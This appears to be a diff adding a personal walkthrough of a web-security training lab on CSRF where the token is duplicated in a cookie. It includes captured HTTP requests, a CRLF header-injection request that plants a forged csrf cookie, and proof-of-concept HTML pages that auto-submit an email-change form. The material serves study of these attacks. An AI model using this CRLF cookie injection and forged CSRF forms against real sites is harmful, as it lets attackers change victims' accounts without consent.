@@ -318,3 +318,75 @@ So our payload will look like this:
 
 Note: SameSite=None needs to let the browser allows us to set the cookie.
 
+Task 6:
+///Lab: CSRF where token is duplicated in cookie///
+
+Log in (wiener/peter), change email 2 times, check request what changed:
+POST /my-account/change-email HTTP/2
+Host: 0a0e00400400912a809b266d0058007c.web-security-academy.net
+Cookie: csrf=6NBbzJ9tWmWwguad1Nh4vHszNcChrsg0; session=bLW9AaFebNXtmBX6nhaYkqTbiSKqE2oj
+Content-Length: 60
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: hu-HU,hu;q=0.9
+Origin: https://0a0e00400400912a809b266d0058007c.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a0e00400400912a809b266d0058007c.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+email=nyuszi%40maci.hu&csrf=6NBbzJ9tWmWwguad1Nh4vHszNcChrsg0
+
+Only email changed...we have csrf token, csrf cookie and a session cookie. We cant change or modify the token or the cookies...Do a search just like before:
+GET /academyLabHeader HTTP/2
+Host: 0a0e00400400912a809b266d0058007c.web-security-academy.net
+Connection: Upgrade
+Pragma: no-cache
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Upgrade: websocket
+Origin: https://0a0e00400400912a809b266d0058007c.web-security-academy.net
+Sec-Websocket-Version: 13
+Accept-Encoding: gzip, deflate, br
+Accept-Language: hu-HU,hu;q=0.9
+Cookie: csrf=6NBbzJ9tWmWwguad1Nh4vHszNcChrsg0; session=bLW9AaFebNXtmBX6nhaYkqTbiSKqE2oj; LastSearchTerm=asd
+Sec-Websocket-Key: 2TPfgd0H2Q8H8QucDiv8vA==
+
+We got a new cookie again just like in the last lab. Send the /?search=xy request to repeater and replace the url part:
+GET /?search=asd%0d%0aSet-Cookie:%20csrf=6NBbzJ9tWmWwguad1Nh4vHszNcChrsg0 HTTP/2 >>>http 200 so its working
+what if we change the csrf here? And we can do it!!! we still get http 200.So generate our csrf poc exploit:
+<html>
+  <body>
+    <form action="https://0a0e00400400912a809b266d0058007c.web-security-academy.net
+/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="maci%40nyuszi.uh" />
+      <input type="hidden" name="csrf" value="6NBbzJ9tWmWwguad1Nh4vHszNcChrsg0" />
+    </form>
+    <script>
+      document.forms[0].submit()
+    </script>
+  </body>
+</html>
+
+Replace the script part like before we have to focus on the csrf part...it has to be the same on both places...
+
+<html>
+  <body>
+    <form action="https://0a0e00400400912a809b266d0058007c.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="macias@nyuszi.uh" />
+      <input type="hidden" name="csrf" value="valami" />
+    </form>
+    <img src="https://0a0e00400400912a809b266d0058007c.web-security-academy.net/?search=asd%0d%0aSet-Cookie:%20csrf=valami%3b%20SameSite=None" onerror="document.forms[0].submit()">
+
+  </body>
+</html>
+
